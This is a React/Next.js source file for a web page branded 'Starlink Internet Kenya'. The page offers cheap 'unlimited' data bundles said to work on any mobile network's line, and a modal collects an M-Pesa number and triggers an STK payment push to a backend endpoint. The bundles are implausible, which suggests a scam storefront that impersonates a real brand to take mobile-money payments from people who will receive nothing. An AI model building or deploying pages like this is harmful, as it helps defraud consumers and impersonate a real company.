"use client";

import React, { useState } from "react";

type Bundle = {
  id: string;
  title: string;
  subtitle: string;
  price: number;
};

const bundles: Bundle[] = [
  { id: "b1", title: "7 Days - Unlimited", subtitle: "1 Week Unlimited Access", price: 299 },
  { id: "b2", title: "15 Days - Unlimited", subtitle: "2 Weeks Unlimited Browsing", price: 499 },
  { id: "b3", title: "50GB - Monthly", subtitle: "Perfect for Streaming & Work", price: 699 },
  { id: "b4", title: "30 Days - Unlimited", subtitle: "Full Month Unlimited Access", price: 899 },
];

export default function StarlinkBundles() {
  const [loadingId, setLoadingId] = useState<string | null>(null);
  const [message, setMessage] = useState<string | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [activeBundle, setActiveBundle] = useState<Bundle | null>(null);
  const [phone, setPhone] = useState("");

  const handleBuy = async () => {
    if (!activeBundle) return;
    if (!phone) {
      setMessage("Please enter a phone number");
      return;
    }

    setLoadingId(activeBundle.id);
    setMessage("Processing payment...");

    const BACKEND_URL =
      process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";

    try {
      const res = await fetch(`${BACKEND_URL}/api/runPrompt`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone,
          amount: activeBundle.price,
          local_id: `O${Date.now().toString(36)}${crypto
            .getRandomValues(new Uint8Array(2))
            .join("")}`,
          transaction_desc: `Payment for ${activeBundle.title}`,
        }),
      });

      const data = await res.json();

      if (data.status) {
        setMessage(`STK Push sent! Check your phone to complete payment.`);
      } else {
        setMessage("Payment failed. Try again.");
      }
    } catch {
      setMessage("Error sending payment. Try again later.");
    } finally {
      setLoadingId(null);
      setShowModal(false);
      setTimeout(() => setMessage(null), 5000);
    }
  };

  return (
    <div className="min-h-screen bg-[#f8fcfa]">
      <header className="bg-green-800 py-8">
        <div className="max-w-6xl mx-auto px-4 text-center">
          <h1 className="text-3xl font-semibold text-white">
            Starlink Internet Offers
          </h1>
          <p className="text-green-200 text-sm mt-1 font-bold">
            Click BUY — Works with the line you purchase from any network
          </p>
          <p className="text-green-200 text-sm mt-1">
            Reliable High-Speed Internet Across Kenya
          </p>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 py-8">
        {/* DEALS */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-5">
          {bundles.map((bundle) => (
            <div
              key={bundle.id}
              className="relative bg-white rounded-lg p-5 border-2 border-green-600 shadow-sm"
            >
              <h3 className="text-sm font-semibold">{bundle.title}</h3>
              <p className="text-xs text-gray-500">{bundle.subtitle}</p>

              <div className="mt-4 flex justify-between items-end">
                <div className="text-lg font-bold text-green-700">
                  Ksh {bundle.price}
                </div>
                <button
                  onClick={() => {
                    setActiveBundle(bundle);
                    setShowModal(true);
                  }}
                  className="text-xs px-3 py-1.5 rounded-full bg-green-600 text-white"
                >
                  BUY
                </button>
              </div>
            </div>
          ))}
        </div>

        {/* ABOUT STARLINK */}
        <div className="mt-12">
          <h2 className="text-xl font-bold text-center text-green-800 mb-6">
            Why Choose Starlink?
          </h2>

          <div className="grid md:grid-cols-3 gap-6">
            <div className="bg-white p-5 rounded-xl border border-green-200 shadow-sm">
              <h3 className="font-semibold text-green-700 mb-2">
                🚀 Ultra Fast Speeds
              </h3>
              <p className="text-sm text-gray-600">
                Enjoy high-speed satellite internet suitable for streaming,
                gaming, business and remote work.
              </p>
            </div>

            <div className="bg-white p-5 rounded-xl border border-green-200 shadow-sm">
              <h3 className="font-semibold text-green-700 mb-2">
                🌍 Works Anywhere
              </h3>
              <p className="text-sm text-gray-600">
                Perfect for rural and urban areas across Kenya. No fiber or
                cable needed.
              </p>
            </div>

            <div className="bg-white p-5 rounded-xl border border-green-200 shadow-sm">
              <h3 className="font-semibold text-green-700 mb-2">
                🔒 Stable & Reliable
              </h3>
              <p className="text-sm text-gray-600">
                Low latency and consistent speeds even during peak hours.
              </p>
            </div>
          </div>

          <div className="text-center mt-8 bg-green-50 p-6 rounded-xl border border-green-300">
            <h3 className="font-bold text-green-800 mb-2">
              Want the Starlink Kit?
            </h3>
            <p className="text-sm text-gray-700">
              For full Starlink installation and equipment purchase,
              call: <span className="font-bold text-green-700">0700 000 000</span>
            </p>
          </div>
        </div>
      </main>

      {/* Modal */}
      {showModal && activeBundle && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 px-4">
          <div className="bg-green-50 max-w-sm w-full p-6 rounded-xl shadow-xl relative">
            <button
              onClick={() => setShowModal(false)}
              className="absolute top-3 right-3 text-green-700 font-bold text-lg"
            >
              &times;
            </button>
            <h2 className="text-xl font-semibold text-green-800 mb-2">
              Starlink Payment
            </h2>
            <p className="text-green-700 text-xs mb-3 italic">
              Enter M-Pesa number below — you will be prompted to enter your PIN on your phone.
            </p>
            <p className="text-green-700 text-sm mb-4">
              {activeBundle.title} - Ksh {activeBundle.price}
            </p>
            <input
              type="tel"
              placeholder="Enter your M-Pesa number"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="w-full px-4 py-2 border border-green-300 rounded-md mb-4 focus:outline-none focus:ring-2 focus:ring-green-700"
            />
            <button
              onClick={handleBuy}
              disabled={loadingId === activeBundle.id}
              className="w-full bg-green-600 text-white font-semibold py-2 rounded-md hover:bg-green-800 transition"
            >
              {loadingId === activeBundle.id
                ? "Processing..."
                : `Pay Ksh ${activeBundle.price}`}
            </button>
          </div>
        </div>
      )}

      {message && (
        <div className="fixed bottom-4 left-1/2 -translate-x-1/2 bg-green-700/90 text-white px-6 py-3 rounded-2xl shadow-lg text-sm z-50">
          {message}
        </div>
      )}

      <footer className="text-center text-gray-400 text-[11px] py-5">
        &copy; {new Date().getFullYear()} Starlink Internet Kenya
      </footer>
    </div>
  );
}
